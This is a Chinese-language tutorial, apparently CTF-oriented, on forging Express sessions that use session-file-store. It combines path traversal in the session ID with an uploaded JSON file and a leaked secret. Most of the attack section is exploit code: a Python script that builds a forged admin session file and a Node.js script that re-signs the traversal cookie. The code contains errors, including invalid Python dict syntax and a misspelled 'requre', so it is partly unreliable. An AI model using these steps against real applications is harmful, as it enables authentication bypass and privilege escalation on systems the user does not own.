我们的 nodejs 中的 session 是依赖于 express 或者其他中间件的一个第三方库，这个库为 express session 的文件存储提供了一个更加快捷的接口，但是当没有 session 合理的配置密钥或者在 session 的配置文件中泄露，就有可能会导致 session 伪造。

## 前提条件：
1. 存在文件上传漏洞
2. 通过爆破或者配置文件获得 session 的 secret。

## 文件结构：
我们的 session 的文件结构形式如下所示：
```
"cookie":{"内容"},
```

我们可以发现我们的这一个文件是铭文存放在我们的 session 目录下，那么我们的 session 的签名是在哪里？我们的签名是在我们的 cookie 中进行签名。

其中，我们的签名的生成部分会进行一个反签名，如果我们的校验成功，就说明我们的签名是正确的，**这个签名和我们的 session 内容无关**。

## 攻击方法：
我们可以通过向 session 中添加 `/xxx` 或者 `../`，来让 session-file-store 将不属于 session 目录的文件夹下的 json 文件当作 session

第一步：上传一个 session 文件，得到文件路径
```python
import time
import json
sess={
	  'username':'admin';
	  'isAdmin':'true';
}
d={"cookie":"Skkhadsfak"};
d.update(sess)
d.update({'__lastAccess':int(time.time()*1000)});
res=json.dumps(d).replace('''"Skkhadsfak"''','''{"origionalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"}''')
print(res);
```
第二步：将这个路径换到 sessionID 的 cokkie 里
第三步：利用泄露得到的 secret 重新计算签名，得到新的 cookie
```js
var cookie=require('cookie');
var crc=require('crc').crc32;
var debug=require('debug')('express-session');
var deprecate=requre('depd')('express-session');
var parseurl=require('parseurl');
var uid=require('uid-safe').sync,onheaders=require('on-headers'),signature=require('cookie-signature')
var val='../static/upload/adslkfjk'//修改后的sessionID
var secret="akjsdfhjasdf"//签名session用到的密钥
var name="auth";
var options=undefined;
var signed='s:'+signature.sign(val,secret);
var data=cookie.serialize(name,signed,options);
debug('set-cookie %s',data);
console.log(data);

```
第四步：带着新的 cookie 去访问即可。